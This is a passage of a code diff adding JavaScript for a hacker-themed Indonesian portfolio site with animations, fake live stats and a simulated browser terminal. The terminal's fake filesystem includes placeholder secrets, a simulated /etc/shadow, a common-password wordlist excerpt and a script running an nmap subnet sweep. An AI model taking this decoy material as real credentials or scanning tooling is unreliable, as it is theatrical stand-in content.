+const ri = (a,b) => Math.floor(r(a,b+1));
+const pk = a => a[ri(0,a.length-1)];
+const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+
+let tTimer;
+function toast(m, d=2200){
+  const t = $('#toast');
+  if(!t) return;
+  t.textContent = m;
+  t.classList.add('show');
+  clearTimeout(tTimer);
+  tTimer = setTimeout(()=>t.classList.remove('show'), d);
+}
+
+/* SOUND */
+const S = {
+  ctx:null, on:true,
+  init(){ if(!this.ctx){ try{ this.ctx = new (window.AudioContext||window.webkitAudioContext)(); }catch(e){} } },
+  b(f=800,d=.05,t='square',v=.03){
+    if(!this.on||!this.ctx) return;
+    try{
+      const o = this.ctx.createOscillator(), g = this.ctx.createGain();
+      o.type=t; o.frequency.value=f; g.gain.value=v;
+      o.connect(g); g.connect(this.ctx.destination);
+      o.start();
+      g.gain.exponentialRampToValueAtTime(.0001, this.ctx.currentTime+d);
+      o.stop(this.ctx.currentTime+d);
+    }catch(e){}
+  },
+  typing(){ this.b(r(200,600),.02,'square',.008); },
+  ok(){ this.b(600,.08); setTimeout(()=>this.b(900,.12),60); },
+  err(){ this.b(180,.15,'sawtooth',.04); },
+  click(){ this.b(1200,.03,'square',.02); }
+};
+
+/* MATRIX */
+function MatrixRain(canvas){
+  this.c = canvas;
+  this.x = canvas.getContext('2d');
+  this.mode = 'classic';
+  this.speed = 33;
+  this.fs = 16;
+  this.density = 1;
+  this.drops = [];
+  this.hue = 0;
+  this.last = 0;
+  this.cs = {
+    classic:'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789',
+    binary:'01',
+    hex:'0123456789ABCDEF',
+    katakana:'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
+    hiragana:'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
+    cyrillic:'АБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ0123456789',
+    dna:'ATGC',
+    emoji:'💀☠️🔥⚡💻🔒🔓🎯💾🖥️⚠️🧬🕶️📡🛰️',
+    math:'+-×÷=≠≈∑∏∫√∞π∆∇⊕⊗⊥∈∉⊂⊃∪∩∧∨∀∃',
+    rainbow:'アイウエオカキクケコ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*',
+    custom:'ADRIANHACKMUL0123456789<>/\\|{}[]#$@!?',
+    mixed:'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*アイウエオカキクケコ'
+  };
+  const self = this;
+  this.resize();
+  window.addEventListener('resize', ()=>self.resize());
+  requestAnimationFrame(t=>self.loop(t));
+}
+MatrixRain.prototype.resize = function(){
+  const d = Math.min(window.devicePixelRatio || 1, 2);
+  this.c.width = window.innerWidth * d;
+  this.c.height = window.innerHeight * d;
+  this.c.style.width = window.innerWidth + 'px';
+  this.c.style.height = window.innerHeight + 'px';
+  this.x.setTransform(d,0,0,d,0,0);
+  const n = Math.ceil(window.innerWidth / this.fs);
+  const self = this;
+  this.drops = [];
+  for(let i=0;i<n;i++) this.drops.push(r(0, Math.ceil(window.innerHeight/this.fs)));
+};
+MatrixRain.prototype.draw = function(){
+  const x = this.x;
+  const ch = this.cs[this.mode] || this.cs.classic;
+  x.fillStyle = 'rgba(4,6,10,.09)';
+  x.fillRect(0,0,window.innerWidth,window.innerHeight);
+  x.font = this.fs + 'px JetBrains Mono, monospace';
+  const p = getComputedStyle(document.body).getPropertyValue('--primary').trim() || '#00ff41';
+  for(let i=0;i<this.drops.length;i++){
+    if(this.density < 1 && Math.random() > this.density) continue;
+    const c = ch[ri(0,ch.length-1)];
+    const px = i * this.fs;
+    const py = this.drops[i] * this.fs;
+    const col = this.mode === 'rainbow' ? 'hsl(' + ((this.hue + i*8) % 360) + ',100%,55%)' : p;
+    x.fillStyle = '#fff';
+    x.shadowColor = col;
+    x.shadowBlur = 8;
+    x.fillText(c, px, py);
+    x.fillStyle = col;
+    x.fillText(ch[ri(0,ch.length-1)], px, py - this.fs);
+    if(py > window.innerHeight && Math.random() > .975) this.drops[i] = 0;
+    this.drops[i] += 1;
+  }
+  x.shadowBlur = 0;
+  this.hue = (this.hue + 2) % 360;
+};
+MatrixRain.prototype.loop = function(t){
+  if(t - this.last >= this.speed){ this.draw(); this.last = t; }
+  const self = this;
+  requestAnimationFrame(tt=>self.loop(tt));
+};
+
+let mx = null;
+try { mx = new MatrixRain($('#matrix')); } catch(e){ console.error(e); }
+
+/* DRAWER + NAV */
+function openDrawer(){ $('#drawer').classList.add('open'); $('#overlay').classList.add('show'); $('#burger').classList.add('open'); S.click(); }
+function closeDrawer(){ $('#drawer').classList.remove('open'); $('#overlay').classList.remove('show'); $('#burger').classList.remove('open'); }
+$('#burger').onclick = function(){ S.init(); if($('#drawer').classList.contains('open')) closeDrawer(); else openDrawer(); };
+$('#overlay').onclick = closeDrawer;
+
+function go(page){
+  closeDrawer();
+  $$('.page').forEach(p=>p.classList.remove('active'));
+  const el = document.getElementById('page-'+page);
+  if(el) el.classList.add('active');
+  $$('.dnav').forEach(n=>n.classList.toggle('active', n.dataset.page === page));
+  if(page === 'desktop'){ openDesktop(); return; }
+  window.scrollTo({top:0, behavior:'smooth'});
+  setTimeout(function(){
+    if(page==='dashboard'){ drawL(); drawR(); }
+    if(page==='terminal' && window.__tIn) window.__tIn.focus();
+  }, 100);
+}
+window.go = go;
+$$('.dnav').forEach(n=>n.onclick = ()=>go(n.dataset.page));
+window.addEventListener('keydown', function(e){
+  if(e.key==='Escape'){ closeDrawer(); $('#modal').classList.remove('show'); $('#mpanel').classList.remove('show'); }
+});
+
+/* MATRIX PANEL */
+$('#mtoggle').onclick = function(e){ e.stopPropagation(); S.init(); S.click(); $('#mpanel').classList.toggle('show'); };
+$('#mclose').onclick = function(){ S.click(); $('#mpanel').classList.remove('show'); };
+document.addEventListener('click', function(e){
+  const p = $('#mpanel'), b = $('#mtoggle');
+  if(!p.classList.contains('show')) return;
+  if(p.contains(e.target) || b.contains(e.target)) return;
+  p.classList.remove('show');
+});
+$$('.mode').forEach(b=>b.onclick = function(){
+  S.click();
+  $$('.mode').forEach(x=>x.classList.remove('active'));
+  b.classList.add('active');
+  if(mx) mx.mode = b.dataset.m;
+  toast('Matrix: '+b.textContent);
+});
+$('#mSpd').oninput = function(e){ if(mx) mx.speed = 130 - parseInt(e.target.value); $('#mSpdV').textContent = e.target.value; };
+$('#mDen').oninput = function(e){ if(mx) mx.density = parseFloat(e.target.value); $('#mDenV').textContent = e.target.value; };
+$('#mSz').oninput = function(e){ if(mx){ mx.fs = parseInt(e.target.value); mx.resize(); } $('#mSzV').textContent = e.target.value; };
+$('#mOp').oninput = function(e){ $('#matrix').style.opacity = e.target.value/100; $('#mOpV').textContent = e.target.value; };
+
+/* SUARA SAMBUTAN ROBOT SERAM: interaksi pertama di mana pun setelah loading */
+(function(){
+  let alreadySpoken = false;
+  function playAdrianWelcome(){
+    if (alreadySpoken || !window.__adrianWelcomeReady) return;
+    if (!('speechSynthesis' in window) || !('SpeechSynthesisUtterance' in window)) return;
+    alreadySpoken = true;
+    try {
+      const say = new SpeechSynthesisUtterance('Hallo, selamat datang di AdrianHackMul.');
+      say.lang = 'id-ID';
+      say.rate = 0.72;
+      say.pitch = 0.12; // nada rendah dan lambat untuk kesan robot seram
+      say.volume = 1;
+      const voices = window.speechSynthesis.getVoices();
+      const indonesianVoice = voices.find(v => /^id(-|_)/i.test(v.lang)) || voices.find(v => /female|male|english/i.test(v.name));
+      if (indonesianVoice) say.voice = indonesianVoice;
+      window.speechSynthesis.cancel();
+      window.speechSynthesis.speak(say);
+      document.removeEventListener('click', onFirstInteraction, true);
+      document.removeEventListener('keydown', onFirstInteraction, true);
+    } catch (err) {
+      alreadySpoken = false;
+      console.warn('Suara sambutan tidak dapat diputar:', err);
+    }
+  }
+  function onFirstInteraction(){ playAdrianWelcome(); }
+  // Capture agar sentuhan/klik pada tombol, gambar, menu, atau area kosong ikut terdeteksi.
+  document.addEventListener('click', onFirstInteraction, true);
+  document.addEventListener('keydown', onFirstInteraction, true);
+})();
+
+/* LOADER */
+(function(){
+  const st = ['BOOTING KERNEL...','LOADING MODULES...','LOADING COMMANDS...','INITIALIZING LEARNING...','ESTABLISHING VPN...','ACCESS GRANTED'];
+  let i = 0, p = 0;
+  const f = $('#ldFill'), s = $('#ldStat');
+  const t = setInterval(function(){
+    p = Math.min(100, p + r(3,9));
+    f.style.width = p + '%';
+    if(i < st.length && p > (i+1)*(100/st.length) - 8) s.textContent = st[i++];
+    if(p >= 100){
+      clearInterval(t);
+      setTimeout(function(){
+        window.__hideLoader();
+        S.init(); S.ok();
+        // Suara robot seram diputar pada klik/interaksi pertama setelah loading selesai.
+        window.__adrianWelcomeReady = true;
+      }, 400);
+    }
+  }, 110);
+})();
+
+/* THEME & SOUND */
+$('#theme').onchange = function(e){ document.body.dataset.theme = e.target.value; S.click(); toast('Theme: '+e.target.value.toUpperCase()); };
+$('#sound').onclick = function(){ S.init(); S.on = !S.on; $('#sound').textContent = S.on ? '🔊' : '🔇'; $('#sound').classList.toggle('active', S.on); if(S.on) S.b(900,.08); };
+
+/* STATUS */
+const rip = function(){ return '10.' + ri(0,255) + '.' + ri(0,255) + '.' + ri(1,254); };
+$('#sIP').textContent = rip();
+setInterval(function(){
+  $('#sPing').textContent = ri(8,120) + 'ms';
+  $('#sCPU').textContent = ri(15,78) + '%';
+  $('#sRAM').textContent = ri(35,72) + '%';
+  $('#sTime').textContent = new Date().toLocaleTimeString('id-ID');
+}, 900);
+setInterval(function(){ $('#sIP').textContent = rip(); }, 12000);
+
+/* STATS */
+function upStats(){
+  const p = ri(1200, 8900);
+  $('#stP').textContent = p.toLocaleString();
+  $('#stPD').textContent = '▲ +' + r(.1, 8).toFixed(1) + '%';
+  $('#stPB').style.width = Math.min(100, p/90) + '%';
+  const n = ri(120, 980);
+  $('#stN').textContent = n;
+  $('#stNB').style.width = Math.min(100, n/10) + '%';
+  const t = pk(['LOW','MEDIUM','HIGH']);
+  const e = $('#stT');
+  e.textContent = t;
+  e.style.color = t === 'LOW' ? 'var(--primary)' : t === 'MEDIUM' ? 'var(--warning)' : 'var(--danger)';
+}
+upStats();
+setInterval(upStats, 2500);
+
+/* LOG */
+const LOGS = [
+  ['INFO','Packet from {ip}'],['OK','Handshake with {ip}'],['WARN','Traffic on port {port}'],
+  ['OK','Key rotated'],['INFO','Proxy chain established'],['ERR','Blocked probe from {ip}'],
+  ['OK','AES-256 initialized'],['INFO','Scanning 10.0.{n}.0/24'],['OK','Tunnel encrypted'],['WARN','Latency {ms}ms']
+];
+function addLog(){
+  const l = pk(LOGS);
+  const tx = l[1].replace('{ip}', rip()).replace('{port}', ri(1024, 65535)).replace('{n}', ri(1, 255)).replace('{ms}', ri(20, 400));
+  const d = document.createElement('div');
+  d.className = 'line';
+  const c = l[0] === 'OK' ? 'ok' : l[0] === 'WARN' ? 'warn' : l[0] === 'ERR' ? 'err' : '';
+  d.innerHTML = '<span style="color:#444">[' + new Date().toLocaleTimeString('id-ID') + ']</span> <span class="' + c + '">[' + l[0] + ']</span> ' + tx.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  const g = $('#log');
+  g.appendChild(d);
+  while(g.children.length > 60) g.removeChild(g.firstChild);
+  g.scrollTop = g.scrollHeight;
+}
+for(let i=0;i<10;i++) addLog();
+setInterval(addLog, 1300);
+
+/* CHARTS */
+function gPC(){ return getComputedStyle(document.body).getPropertyValue('--primary').trim() || '#00ff41'; }
+function gAC(){ return getComputedStyle(document.body).getPropertyValue('--accent').trim() || '#00d9ff'; }
+function h2r(h, a){
+  h = h.replace('#','');
+  if(h.length === 3) h = h.split('').map(c=>c+c).join('');
+  return 'rgba(' + parseInt(h.substr(0,2),16) + ',' + parseInt(h.substr(2,2),16) + ',' + parseInt(h.substr(4,2),16) + ',' + a + ')';
+}
+let ld = [];
+for(let i=0;i<40;i++) ld.push(r(20,80));
+
+function drawL(){
+  const c = $('#lineC');
+  if(!c) return;
+  const x = c.getContext('2d');
+  const d = Math.min(window.devicePixelRatio || 1, 2);
+  const rt = c.getBoundingClientRect();
+  if(!rt.width) return;
+  c.width = rt.width * d;
+  c.height = 200 * d;
+  c.style.height = '200px';
+  x.setTransform(d,0,0,d,0,0);
+  const W = rt.width, H = 200;
+  x.clearRect(0,0,W,H);
+  x.strokeStyle = 'rgba(255,255,255,.05)';
+  for(let i=0;i<=5;i++){ const y = H/5*i; x.beginPath(); x.moveTo(0,y); x.lineTo(W,y); x.stroke(); }
+  for(let i=0;i<=8;i++){ const xx = W/8*i; x.beginPath(); x.moveTo(xx,0); x.lineTo(xx,H); x.stroke(); }
+  const p = gPC(), a = gAC();
+  x.beginPath(); x.moveTo(0,H);
+  for(let i=0;i<ld.length;i++){ const xx = W/(ld.length-1)*i, y = H - ld[i]/100*H; x.lineTo(xx,y); }
+  x.lineTo(W,H); x.closePath();
+  const g = x.createLinearGradient(0,0,0,H);
+  g.addColorStop(0, h2r(p,.35)); g.addColorStop(1, h2r(p,0));
+  x.fillStyle = g; x.fill();
+  x.beginPath();
+  for(let i=0;i<ld.length;i++){ const xx = W/(ld.length-1)*i, y = H - ld[i]/100*H; i === 0 ? x.moveTo(xx,y) : x.lineTo(xx,y); }
+  x.strokeStyle = p; x.lineWidth = 2; x.shadowColor = p; x.shadowBlur = 8;
+  x.stroke(); x.shadowBlur = 0;
+  const ly = H - ld[ld.length-1]/100*H;
+  x.fillStyle = a; x.beginPath(); x.arc(W-2, ly, 4, 0, Math.PI*2); x.fill();
+}
+setInterval(function(){ ld.push(Math.min(100, Math.max(5, ld[ld.length-1] + r(-15, 15)))); ld.shift(); drawL(); }, 800);
+
+const sk = ['NET','CRYPTO','REVERSE','SOCIAL','CODE','AI'];
+const sv = [98,95,92,88,90,85];
+function drawR(){
+  const c = $('#radarC');
+  if(!c) return;
+  const x = c.getContext('2d');
+  const d = Math.min(window.devicePixelRatio || 1, 2);
+  const rt = c.getBoundingClientRect();
+  if(!rt.width) return;
+  c.width = rt.width * d;
+  c.height = 220 * d;
+  c.style.height = '220px';
+  x.setTransform(d,0,0,d,0,0);
+  const W = rt.width, H = 220;
+  x.clearRect(0,0,W,H);
+  const cx = W/2, cy = H/2, R = Math.min(W,H)/2 - 30, N = sk.length;
+  x.strokeStyle = 'rgba(255,255,255,.08)';
+  for(let rr=1;rr<=4;rr++){
+    x.beginPath();
+    for(let i=0;i<N;i++){
+      const a = Math.PI*2/N*i - Math.PI/2;
+      const xx = cx + Math.cos(a)*R*rr/4;
+      const y = cy + Math.sin(a)*R*rr/4;
+      i === 0 ? x.moveTo(xx,y) : x.lineTo(xx,y);
+    }
+    x.closePath(); x.stroke();
+  }
+  for(let i=0;i<N;i++){
+    const a = Math.PI*2/N*i - Math.PI/2;
+    x.beginPath(); x.moveTo(cx,cy); x.lineTo(cx + Math.cos(a)*R, cy + Math.sin(a)*R); x.stroke();
+  }
+  const p = gPC();
+  x.beginPath();
+  for(let i=0;i<N;i++){
+    const a = Math.PI*2/N*i - Math.PI/2;
+    const xx = cx + Math.cos(a)*R*sv[i]/100;
+    const y = cy + Math.sin(a)*R*sv[i]/100;
+    i === 0 ? x.moveTo(xx,y) : x.lineTo(xx,y);
+  }
+  x.closePath();
+  x.fillStyle = h2r(p,.25); x.fill();
+  x.strokeStyle = p; x.lineWidth = 2; x.shadowColor = p; x.shadowBlur = 10;
+  x.stroke(); x.shadowBlur = 0;
+  x.fillStyle = '#6e7681'; x.font = "10px 'JetBrains Mono'"; x.textAlign = 'center'; x.textBaseline = 'middle';
+  for(let i=0;i<N;i++){
+    const a = Math.PI*2/N*i - Math.PI/2;
+    x.fillText(sk[i], cx + Math.cos(a)*(R+18), cy + Math.sin(a)*(R+18));
+  }
+}
+setTimeout(function(){ drawL(); drawR(); }, 200);
+window.addEventListener('resize', function(){ drawL(); drawR(); });
+
+setTimeout(function(){ $$('.skill-b > div').forEach(e => e.style.width = e.dataset.s + '%'); }, 400);
+
+/* =========================================================
+   TERMINAL
+   ========================================================= */
+const FS = {
+  '/':{t:'d',c:['home','etc','var','tmp','root','usr','bin']},
+  '/home':{t:'d',c:['adrian']},
+  '/home/adrian':{t:'d',c:['Documents','Downloads','scripts','notes.txt','.bashrc','.ssh']},
+  '/home/adrian/Documents':{t:'d',c:['report.pdf','secrets.txt','todo.md']},
+  '/home/adrian/Downloads':{t:'d',c:['backup.tar.gz','rockyou.txt']},
+  '/home/adrian/scripts':{t:'d',c:['scan.sh','backup.sh']},
+  '/home/adrian/.ssh':{t:'d',c:['id_rsa','id_rsa.pub','known_hosts']},
+  '/home/adrian/notes.txt':{t:'f',s:824,x:'TODO:\n  - Review security audit report\n  - Rotate SSH keys\n  - Update firewall rules\n'},
+  '/home/adrian/.bashrc':{t:'f',s:3771,x:'# ~/.bashrc\nexport PS1="\\u@\\h:\\w\\$ "\nalias ll="ls -la"\n'},
+  '/home/adrian/Documents/secrets.txt':{t:'f',s:180,x:'[VAULT - SIMULATION]\nAPI_KEY=sk_live_FAKE_xxxxxxxxxxxxx\nDB_PASS=Sup3rS3cur3!\n'},
+  '/home/adrian/Documents/todo.md':{t:'f',s:247,x:'# TODO\n- [x] Setup VPS\n- [ ] Write report\n- [ ] Learn Rust\n'},
+  '/home/adrian/Documents/report.pdf':{t:'f',s:1048576,x:'%PDF-1.4 [binary]\n'},
+  '/home/adrian/Downloads/rockyou.txt':{t:'f',s:139921497,x:'123456\npassword\n12345678\nqwerty\nabc123\nmonkey\n1234567\nletmein\ndragon\n111111\niloveyou\nadmin\nwelcome\nlogin\nprincess\n'},
+  '/home/adrian/Downloads/backup.tar.gz':{t:'f',s:52428800,x:'[binary]\n'},
+  '/home/adrian/scripts/scan.sh':{t:'f',s:342,exec:true,x:'#!/bin/bash\necho "Scanning..."\nnmap -sn 192.168.1.0/24\n'},
+  '/home/adrian/scripts/backup.sh':{t:'f',s:198,exec:true,x:'#!/bin/bash\ntar -czf /backup/$(date +%F).tar.gz /home/adrian/Documents\n'},
+  '/home/adrian/.ssh/id_rsa':{t:'f',s:1876,x:'-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED]\n-----END OPENSSH PRIVATE KEY-----\n'},
+  '/home/adrian/.ssh/id_rsa.pub':{t:'f',s:572,x:'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGxK8f2yQz9pVnL5wXjH3mB7cN4dR6tY8sE1aF2gH3jK adrian@hackmul\n'},
+  '/home/adrian/.ssh/known_hosts':{t:'f',s:1247,x:'github.com ssh-ed25519 AAAA...\n'},
+  '/etc':{t:'d',c:['passwd','shadow','hosts','os-release','resolv.conf']},
+  '/etc/passwd':{t:'f',s:2847,x:'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nadrian:x:1000:1000:Adrian Hackmul,,,:/home/adrian:/bin/bash\n'},
+  '/etc/shadow':{t:'f',s:1673,x:'root:$6$rounds=656000$xxx$SIMULATED:HASH:19000:0:99999:7:::\nadrian:$6$rounds=656000$yyy$SIMULATED:HASH:19000:0:99999:7:::\n'},
+  '/etc/hosts':{t:'f',s:220,x:'127.0.0.1\tlocalhost\n127.0.1.1\tadrian-hackmul\n::1\tlocalhost ip6-localhost\n'},
+  '/etc/os-release':{t:'f',s:387,x:'PRETTY_NAME="AdrianHackMul OS 1.0"\nNAME="AdrianHackMul"\nVERSION_ID="1.0"\n'},
+  '/etc/resolv.conf':{t:'f',s:88,x:'nameserver 1.1.1.1\nnameserver 8.8.8.8\n'},
+  '/var':{t:'d',c:['log','www']},
+  '/var/log':{t:'d',c:['auth.log','syslog']},
+  '/var/log/auth.log':{t:'f',s:2048,x:'Oct 11 12:34:56 adrian-hackmul sshd[1234]: Accepted publickey for adrian from 10.0.0.5\n'},
+  '/var/log/syslog':{t:'f',s:4096,x:'Oct 11 12:30:01 adrian-hackmul CRON[1234]: (root) CMD\n'},
+  '/var/www':{t:'d',c:['html']},
+  '/var/www/html':{t:'d',c:['index.html']},
+  '/var/www/html/index.html':{t:'f',s:512,x:'<!DOCTYPE html>\n<html><head><title>AdrianHackMul</title></head><body><h1>It works!</h1></body></html>\n'},
+  '/tmp':{t:'d',c:['session.lock']},
+  '/tmp/session.lock':{t:'f',s:0,x:''},
+  '/root':{t:'d',c:['.bash_history']},
+  '/root/.bash_history':{t:'f',s:0,x:'# Permission denied\n'},
+  '/usr':{t:'d',c:['bin','share']},
+  '/usr/bin':{t:'d',c:['python3','node','nmap','git','curl','vim','sudo','ssh','bash']},
+  '/usr/share':{t:'d',c:['wordlists']},
+  '/usr/share/wordlists':{t:'d',c:['rockyou.txt','top100.txt']},
+  '/usr/share/wordlists/rockyou.txt':{t:'f',s:139921497,x:'123456\npassword\n12345678\n...\n'},
+  '/usr/share/wordlists/top100.txt':{t:'f',s:1024,x:'123456\npassword\n12345678\nqwerty\n'},
+  '/bin':{t:'d',c:['ls','cat','echo','bash','sh']}
+};
+
+const TS = { cwd:'/home/adrian', user:'adrian', host:'hackmul', home:'/home/adrian', history:[], histIdx:-1, isRoot:false };
+const _bootTime = Date.now();
+
+const tOut = $('#tOut');
+const tIn = $('#tInput');
+const tBody = $('#tBody');
+const tText = $('#tText');
+const tPromptEl = $('#tPrompt');
+const termTitle = $('#termTitle');
+const acBox = $('#ac');
+window.__tIn = tIn;
+
+const slp = ms => new Promise(res => setTimeout(res, ms));
+function splitP(p){ return p.split('/').filter(Boolean); }
+function resolvePath(base, target){
+  if(target === undefined || target === null || target === '') return base;
+  let parts;
+  if(target.startsWith('/')) parts = splitP(target);
+  else if(target === '~') parts = splitP(TS.home);
+  else if(target.startsWith('~/')) parts = splitP(TS.home).concat(splitP(target.slice(2)));
+  else parts = splitP(base).concat(splitP(target));
+  const out = [];
+  for(let i=0;i<parts.length;i++){
+    const p = parts[i];
+    if(p === '.' || p === '') continue;
+    if(p === '..') out.pop();
+    else out.push(p);
+  }
+  return '/' + out.join('/');
+}
+function updatePrompt(){
+  let cwd = TS.cwd;
+  if(cwd === TS.home) cwd = '~';
+  else if(cwd.startsWith(TS.home + '/')) cwd = '~' + cwd.slice(TS.home.length);
+  const u = TS.isRoot ? 'root' : TS.user;
+  const sym = TS.isRoot ? '#' : '$';
+  tPromptEl.innerHTML = '<span style="color:var(--primary)">' + u + '</span><span style="color:var(--dim)">@</span><span style="color:var(--primary)">' + TS.host + '</span><span style="color:var(--dim)">:</span><span style="color:var(--accent)">' + cwd + '</span><span style="color:var(--text)">' + sym + '</span> ';
+  if(termTitle) termTitle.textContent = u + '@' + TS.host + ': ' + cwd + ' — bash';
+}
+function wT(text, cls){
+  const d = document.createElement('div');
+  d.className = 't-line ' + (cls || '');
+  d.textContent = text;
+  tOut.appendChild(d);
+  tBody.scrollTop = tBody.scrollHeight;
+  return d;
+}
+function wH(html, cls){
+  const d = document.createElement('div');
+  d.className = 't-line ' + (cls || '');
+  d.innerHTML = html;
+  tOut.appendChild(d);
+  tBody.scrollTop = tBody.scrollHeight;
+  return d;
+}
+function updateMirror(){ tText.textContent = tIn.value; }
+
+let CAPTURE = null;
+function out(txt, cls){ if(CAPTURE !== null){ CAPTURE.push(txt); } else { wT(txt, cls); } }
+function outH(html, cls){ if(CAPTURE !== null){ CAPTURE.push(html.replace(/<[^>]+>/g,'')); } else { wH(html, cls); } }
+
+async function pipeCmd(cmd, input){
+  const parts = cmd.trim().split(/\s+/);
+  const c = parts[0];
+  const args = parts.slice(1);
+  switch(c){
+    case 'grep': {
+      const pat = (args.filter(a=>!a.startsWith('-'))[0] || '').replace(/['"]/g,'');
+      return input.split('\n').filter(l => pat ? l.indexOf(pat) !== -1 : true).join('\n');
+    }
+    case 'head': {
+      const n = parseInt((args[0] || '').replace(/^-n?/,'')) || 10;
+      return input.split('\n').slice(0, n).join('\n');
+    }
+    case 'tail': {
+      const n = parseInt((args[0] || '').replace(/^-n?/,'')) || 10;
+      return input.split('\n').slice(-n).join('\n');
+    }
+    case 'wc': return input.split('\n').filter(Boolean).length + '';
+    case 'sort': return input.split('\n').sort().join('\n');
+    case 'uniq': return Array.from(new Set(input.split('\n'))).join('\n');
+    case 'cat': return input;
+    default: return input;
+  }
+}
+async function executeSingle(line){
+  const trimmed = line.trim();
+  if(!trimmed) return;
+  if(trimmed.indexOf('|') !== -1){
+    const parts = trimmed.split(/\s*\|\s*/);
+    CAPTURE = [];
+    await runCmd(parts[0]);
+    let data = CAPTURE.join('\n');
+    CAPTURE = null;
+    for(let i=1;i<parts.length;i++) data = await pipeCmd(parts[i], data);
+    if(data !== null && data !== undefined) wT(String(data));
+    return;
+  }
+  await runCmd(trimmed);
+}
+async function execute(input){
+  const trimmed = input.trim();
+  if(!trimmed) return;
+  const parts = trimmed.split(/\s*&&\s*|\s*;\s*/);
+  for(let i=0;i<parts.length;i++) if(parts[i].trim()) await executeSingle(parts[i].trim());
+}
+
+const CMDS = ['help','about','whoami','id','hostname','uname','uptime','date','cal','clear','exit','history','echo','pwd','cd','ls','cat','head','tail','mkdir','rmdir','touch','rm','cp','mv','tree','find','which','man','sudo','su','apt','pkg','git','ssh','ping','curl','wget','nmap','nc','scan','hack','trace','crack','decrypt','matrix','theme','sound','search','desktop','banner','contact','stats','neofetch','fortune','cowsay','figlet','ps','df','free','top','nano','vim','python','python3','node'];
+const DESC = {help:'Show command list',about:'About shell',whoami:'Current user',id:'User info',hostname:'Hostname',uname:'System info',uptime:'Uptime',date:'Date',cal:'Calendar',clear:'Clear',exit:'Exit',history:'History',echo:'Print',pwd:'Working dir',cd:'Change dir',ls:'List',cat:'Read',head:'First lines',tail:'Last lines',mkdir:'Make dir',rmdir:'Remove dir',touch:'Touch',rm:'Remove',cp:'Copy',mv:'Move',tree:'Tree',find:'Find',which:'Which',man:'Manual',sudo:'Run as root',su:'Switch user',apt:'Package mgr',pkg:'Termux pkg',git:'Git',ssh:'SSH',ping:'Ping',curl:'Curl',wget:'Wget',nmap:'Port scan',nc:'Netcat',scan:'Quick scan',hack:'Simulate hack',trace:'Trace route',crack:'Crack hash',decrypt:'Decrypt',matrix:'Toggle matrix',theme:'Set theme',sound:'Toggle sound',search:'Search commands',desktop:'Hacker desktop',banner:'Banner',contact:'Contact',stats:'Stats',neofetch:'Neofetch',fortune:'Fortune',cowsay:'Cowsay',figlet:'Figlet',ps:'Process list',df:'Disk usage',free:'Memory',top:'Top',nano:'Editor',vim:'Editor',python:'Python',python3:'Python',node:'Node'};
+
+function getCompletions(value){
+  const parts = value.split(/\s+/);
+  const last = parts[parts.length-1];
+  if(parts.length === 1){
+    return CMDS.filter(c => c.indexOf(last) === 0 && c !== last).map(c => ({text:c, type:'cmd', desc:DESC[c] || ''}));
+  }
+  const path = last || '';
+  const dir = path.indexOf('/') !== -1 ? path.slice(0, path.lastIndexOf('/')+1) : '';
+  const base = path.indexOf('/') !== -1 ? path.slice(path.lastIndexOf('/')+1) : path;
+  const resolvedDir = resolvePath(TS.cwd, dir || '.');
+  const node = FS[resolvedDir];
+  if(!node || node.t !== 'd') return [];
+  return node.c.filter(n => n.indexOf(base) === 0).map(n => {
+    const full = resolvePath(resolvedDir, n);
+    const isDir = FS[full] && FS[full].t === 'd';
+    return {text: dir + n + (isDir ? '/' : ''), type: isDir ? 'dir' : 'file', desc: isDir ? 'directory' : (FS[full] && FS[full].exec ? 'executable' : 'file')};
+  });
+}
+let acItems = [], acIdx = -1;
+function showAC(items){
+  acItems = items;
+  acIdx = -1;
+  if(!items.length){ acBox.classList.remove('show'); return; }
+  let html = '';
+  for(let i=0;i<Math.min(items.length, 15);i++){
+    const x = items[i];
+    html += '<div class="ac-i' + (i === 0 ? ' active' : '') + '" data-i="' + i + '"><b>' + esc(x.text) + '</b><span class="ac-type">' + x.type + '</span><span class="ac-d">' + esc(x.desc) + '</span></div>';
+  }
+  acBox.innerHTML = html;
+  acBox.classList.add('show');
+  acBox.querySelectorAll('.ac-i').forEach(function(el, i){
+    el.onmousedown = function(e){ e.preventDefault(); applyAC(i); };
+  });
+}
+function hideAC(){ acBox.classList.remove('show'); acIdx = -1; acItems = []; }
+function applyAC(i){
+  if(!acItems[i]) return;
+  const v = tIn.value;
+  const parts = v.split(/\s+/);
+  parts[parts.length-1] = acItems[i].text;
+  tIn.value = parts.join(' ') + (acItems[i].type === 'cmd' ? ' ' : '');
+  updateMirror();
+  hideAC();
+  tIn.focus();
+}
+function highlightAC(){ acBox.querySelectorAll('.ac-i').forEach(function(el, i){ el.classList.toggle('active', i === acIdx); }); }
+function addHistory(cmd){
+  if(!cmd.trim()) return;
+  TS.history.push(cmd);
+  if(TS.history.length > 200) TS.history.shift();
+  TS.histIdx = TS.history.length;
+}
+
+/* NANO */
+let nanoFile = null;
+function openNano(file, content){
+  nanoFile = file;
+  $('#nanoTitle').textContent = '  GNU nano 7.2 — ' + (file || 'New Buffer');
+  $('#nanoText').value = content || '';
+  $('#nanoEditor').classList.add('show');
+  setTimeout(function(){ $('#nanoText').focus(); }, 100);
+}
+function closeNano(save){
+  if(save && nanoFile){
+    const r = resolvePath(TS.cwd, nanoFile);
+    FS[r] = {t:'f', s:$('#nanoText').value.length, x:$('#nanoText').value};
+    const parent = r.slice(0, r.lastIndexOf('/')) || '/';
+    const name = r.slice(r.lastIndexOf('/')+1);
